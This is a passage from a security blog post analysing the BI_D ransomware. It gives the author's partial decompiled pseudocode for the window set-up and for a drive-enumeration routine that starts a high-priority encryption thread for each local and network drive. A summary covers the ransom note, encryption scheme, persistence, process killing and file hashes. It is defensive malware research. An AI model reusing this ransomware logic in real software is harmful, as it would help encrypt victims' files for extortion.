var_30.cbSize = 0x30;<br />
var_30.style = CS_VREDRAW_AND_HREDRAW;<br />
var_30.lpfnWndProc = RANSOM__CallMainFunctionality;<br />
var_30.CbClsExtra = 0;<br />
var_30.cbWndExtra = 0x1e;<br />
var_30.hInstance = hInstance;<br />
var_30.hbrBackground = COLOR_BTNSHADOW;<br />
var_30.lpszClassName = &#8220;notepad++&#8221;;<br />
RegisterClassExA(*var_30);<br />
CreateDialogParamA(hInstance, 0x65, 0, RANSOM__CallMainFunctionality, 0);<br />
ShowWindow(hWnd, nCmdShow);<br />
UpdateWindow(hWnd);<br />
while ( GetMessageA(&amp;lpMsg, 0, 0, 0) != 0 ){ /* so keep looping unless we get the WM_QUIT message */<br />
TranslateMessage(&amp;Msg);<br />
DispatchMessageA(&amp;Msg);<br />
}<br />
CryptDestroyKey(phKey);<br />
return(Msg.wParam);<br />
}<br />
</em></p>
<p>One of the subsequent functions that I found interesting was one that begins at 401676 that I named RANSOM__FindDrivesEnumResources. I imagine that this isn&#8217;t a terribly exciting function but I thought it was interesting to dig into how calls to GetLogicalDrives() actually works and how the ransomware appears to use the returned bitmask from this function to determine how many threads to create to encrypt files found there.</p>
<p><a href="https://zirconic.net/wp-content/uploads/2018/07/snippet2.txt">Download code snippet 2</a></p>
<p><em><br />
void __cdecl RANSOM__FindDrivesEnumResources(){</p>
<p>int &amp;ThreadId;</p>
<p>/* used in my interpretation of the recreated code, perhaps invalid: */<br />
int i, drivebitmask;</p>
<p>drivebitmask = GetLogicalDrives();<br />
/* If the function succeeds, the return value is a bitmask representing the currently available disk drives. *<br />
* Bit position 0 (the least-significant bit) is drive A, bit position 1 is drive B, bit position 2 is drive C, and so on. *<br />
* On my test system, I have C and D so I should get back 000&#8230;00001100 in eax */ */</p>
<p>for (i = 25, i &gt;= 0, i&#8211;){</p>
<p>    if(((0x1 &lt;&lt; i) &amp; drivebitmask) != 0){<br />
    /* I suppose you could insert the call to GetLogicalDrives() in the loop, but that&#8217;s not how the disassemby looked to me */<br />
    hThread = CreateThread(0, 0, RANSOM__PassWildcardsToEncLogicalDriveFiles, i, 0, &amp;ThreadId);</p>
<p>    SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);</p>
<p>        }</p>
<p>    }</p>
<p>/****************************************************************************************************<br />
* this comment refers to the disassembly, but should also be useful here to understand this func:<br />
* as noted earlier, returns 000&#8230;00001100 to eax and then we have 0x19 in ecx or 00011001<br />
* ebx = 1<br />
* cl = 0x19 = 00011001<br />
* ebx &lt;&lt; cl = ebx &lt;&lt; 1 = 1 &lt;&lt; 19 = essentially shifted way out to be almost irrelevant<br />
* ebx &amp; eax = 000&#8230;.0 &amp; 00001100 = 00000000<br />
* dec ecx = 0x19&#8211; = 00011000 and loop back to top<br />
*<br />
* we keep doing this over and over until we start to get to the bottom of ECX&#8230; for instance:<br />
* cl = 2 = 00000011<br />
* ebx = 1<br />
* ebx &lt;&lt; cl = 00000001 &lt;&lt; 2 = 00000100<br />
* ebx &amp; eax = 00000100 &amp; 00001100 = 00000100 = not zero because now we hit on the C:\ drive bit<br />
* so NOW we execute the createthread<br />
*<br />
* Since originally ECX is set to 0x19 (25), seems like what we&#8217;e doing here is iterating through<br />
* all possible drive letters, since GetLogicalDrives returns a bitmask where each bit<br />
* represents some drive&#8230;<br />
*<br />
****************************************************************************************************/</p>
<p>hThread = CreateThread(0, 0, RANSOM__EnumNetworkDrivesNewEnum, 0, 0, &amp;ThreadId);<br />
SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);</p>
<p>}</p>
<p>&nbsp;<br />
</em></p>
<p>Summarizing the overall functionality of this ransomware based on the overall disassembly and decompilation, it can be seen that BI_D:<br />
&#8211; Drops a ransom note called &#8220;How To Restore Files.txt&#8221; containing instructions asking the victim to contact <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="62000b053d060701101b12160d1022030d0e4c010d0f">[email&#160;protected]</a> for details on how to pay for file decryption (and requests that the DECODE.KEY file be sent to the ransomware controller)<br />
&#8211; Creates multiple threads to encrypt files on connected and networked drives using the RSA/AES256 combination shown above, though is careful not to encrypt already encrypted files (with a .BI_D extension), the ransom note, or those in the Windows directory<br />
&#8211; Achieves persistance via the Registry and also takes various steps to both gain greater access to the victim&#8217;s machine as well as complicate recovery of encrypted files<br />
&#8211; Kills all processes on the victim&#8217;s machine besides the ransomware process itself and a small process whitelist shown in the screenshot below:</p>
<p><img fetchpriority="high" decoding="async" src="https://zirconic.net/wp-content/uploads/2018/07/BI_D_Safe_Process_List.png" alt="" width="1183" height="231" class="alignnone size-full wp-image-692" srcset="https://zirconic.net/wp-content/uploads/2018/07/BI_D_Safe_Process_List.png 1183w, https://zirconic.net/wp-content/uploads/2018/07/BI_D_Safe_Process_List-300x59.png 300w, https://zirconic.net/wp-content/uploads/2018/07/BI_D_Safe_Process_List-768x150.png 768w, https://zirconic.net/wp-content/uploads/2018/07/BI_D_Safe_Process_List-1024x200.png 1024w" sizes="(max-width: 1183px) 100vw, 1183px" /></p>
<p>File details:<br />
MD5: 3cf87e475a67977ab96dff95230f8146<br />
SHA1:1fb3dbd6e4ee27bddfcd1935065339e04dae435c<br />
SHA256: 307bca9a514b1e5038926a0bafc7bc08d131dd6fe3998f31cb1e614e16effe32<br />
Size: 11776 bytes</p>
<p>Controller/developer email address: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f1939896ae959492838881859e83b1909e9ddf929e9c">[email&#160;protected]</a><br />
Encrypted file extension: .BI_D<br />
Installs itself to: &#8220;c:\Windows\notepad+++.exe&#8221;<br />
Drops a ransom note to: &#8220;c:\How To Restore Files.txt&#8221;<br />
Ransom note template:</p>
<p><img decoding="async" src="https://zirconic.net/wp-content/uploads/2018/07/BI_D_Ransom_Note_Array.png" alt="" width="1281" height="289" class="alignnone size-full wp-image-691" srcset="https://zirconic.net/wp-content/uploads/2018/07/BI_D_Ransom_Note_Array.png 1281w, https://zirconic.net/wp-content/uploads/2018/07/BI_D_Ransom_Note_Array-300x68.png 300w, https://zirconic.net/wp-content/uploads/2018/07/BI_D_Ransom_Note_Array-768x173.png 768w, https://zirconic.net/wp-content/uploads/2018/07/BI_D_Ransom_Note_Array-1024x231.png 1024w, https://zirconic.net/wp-content/uploads/2018/07/BI_D_Ransom_Note_Array-1200x271.png 1200w" sizes="(max-width: 1281px) 100vw, 1281px" /></p>
	</div><!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="https://zirconic.net/category/malware/" rel="category tag">Malware</a></span><span class="tags-links">Tagged <a href="https://zirconic.net/tag/aes/" rel="tag">AES</a>, <a href="https://zirconic.net/tag/malware/" rel="tag">Malware</a>, <a href="https://zirconic.net/tag/ransomware/" rel="tag">ransomware</a>, <a href="https://zirconic.net/tag/windows/" rel="tag">Windows</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://zirconic.net/2017/10/darktrack/" rel="prev">Darktrack</a></div><div class="nav-next"><a href="https://zirconic.net/2018/09/ancient-malware-still-circulating-on-chinese-sites/" rel="next">Ancient Malware Still Circulating on Chinese Sites</a></div></div>
	</nav>
					</main><!-- #main -->
				</div><!-- #primary -->
			</div><!-- .columns small-12 medium-8 -->
			<div class="columns small-12 medium-4">
				
<aside id="secondary" class="widget-area" role="complementary">
	<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://zirconic.net/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>
		<section id="recent-posts-2" class="widget widget_recent_entries">
		<h2 class="widget-title">Recent Posts</h2>
		<ul>
											<li>
					<a href="https://zirconic.net/2020/02/happy-howlidays-hur-hur/">Happy Howlidays (hur hur)</a>
									</li>
											<li>
					<a href="https://zirconic.net/2020/01/a-weapon-to-surpass-metal-gear/">A Weapon To Surpass Metal Gear</a>
									</li>
											<li>
					<a href="https://zirconic.net/2019/03/bi_d-ransomware-redux-now-with-100-more-ghidra/">BI_D Ransomware Redux (Now With 100% More Ghidra)</a>
									</li>
											<li>
					<a href="https://zirconic.net/2019/03/ghidra-fuck-yeah/">Ghidra, Fuck Yeah!</a>
									</li>
											<li>
					<a href="https://zirconic.net/2018/09/ancient-malware-still-circulating-on-chinese-sites/">Ancient Malware Still Circulating on Chinese Sites</a>
									</li>
					</ul>

		</section><section id="recent-comments-2" class="widget widget_recent_comments"><h2 class="widget-title">Recent Comments</h2><ul id="recentcomments"></ul></section><section id="archives-2" class="widget widget_archive"><h2 class="widget-title">Archives</h2>
			<ul>
					<li><a href='https://zirconic.net/2020/02/'>February 2020</a></li>
	<li><a href='https://zirconic.net/2020/01/'>January 2020</a></li>
	<li><a href='https://zirconic.net/2019/03/'>March 2019</a></li>
	<li><a href='https://zirconic.net/2018/09/'>September 2018</a></li>
	<li><a href='https://zirconic.net/2018/07/'>July 2018</a></li>
	<li><a href='https://zirconic.net/2017/10/'>October 2017</a></li>
	<li><a href='https://zirconic.net/2017/05/'>May 2017</a></li>
	<li><a href='https://zirconic.net/2016/10/'>October 2016</a></li>
	<li><a href='https://zirconic.net/2016/09/'>September 2016</a></li>
	<li><a href='https://zirconic.net/2016/08/'>August 2016</a></li>
	<li><a href='https://zirconic.net/2016/07/'>July 2016</a></li>
	<li><a href='https://zirconic.net/2016/06/'>June 2016</a></li>
			</ul>

			</section><section id="nav_menu-2" class="widget widget_nav_menu"><h2 class="widget-title">Me</h2><div class="menu-me-container"><ul id="menu-me" class="menu"><li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://zirconic.net/about/">About</a></li>
</ul></div></section><section id="categories-2" class="widget widget_categories"><h2 class="widget-title">Categories</h2>
			<ul>
					<li class="cat-item cat-item-61"><a href="https://zirconic.net/category/hardware/">Hardware</a>
</li>
	<li class="cat-item cat-item-13"><a href="https://zirconic.net/category/honeypots/">Honeypots</a>
</li>
	<li class="cat-item cat-item-31"><a href="https://zirconic.net/category/icsscada/">ICS/SCADA</a>
</li>
	<li class="cat-item cat-item-10"><a href="https://zirconic.net/category/malware/">Malware</a>
</li>
	<li class="cat-item cat-item-45"><a href="https://zirconic.net/category/mobile/">Mobile</a>
</li>
	<li class="cat-item cat-item-11"><a href="https://zirconic.net/category/spam/">Spam</a>
</li>
	<li class="cat-item cat-item-60"><a href="https://zirconic.net/category/tools/">Tools</a>
</li>
			</ul>

			</section><section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Meta</h2>
		<ul>
						<li><a href="https://zirconic.net/wp-login.php">Log in</a></li>
			<li><a href="https://zirconic.net/feed/">Entries feed</a></li>
			<li><a href="https://zirconic.net/comments/feed/">Comments feed</a></li>

			<li><a href="https://wordpress.org/">WordPress.org</a></li>
		</ul>

		</section></aside><!-- #secondary -->
			</div><!-- .columns small-12 medium-4 -->
		</div><!-- .row -->
	</section><!-- .section-fullwidth section-main -->


	</div><!-- #content -->

	<footer id="colophon" class="site-footer section-fullwidth" role="contentinfo">
		<div class="row">
			<div class="columns small-12">
				<div class="site-info">
					<a href="https://wordpress.org/">Proudly powered by WordPress</a>
					<span class="sep"> | </span>
					Theme: micro, developed by <a href="http://devrix.com">DevriX</a>.				</div><!-- .site-info -->
			</div><!-- .small-12 -->
		</div><!-- .row -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="https://zirconic.net/wp-content/themes/micro/assets/scripts/bundle.min.js?ver=20200207" id="micro-navigation-js"></script>

</body>
</html>
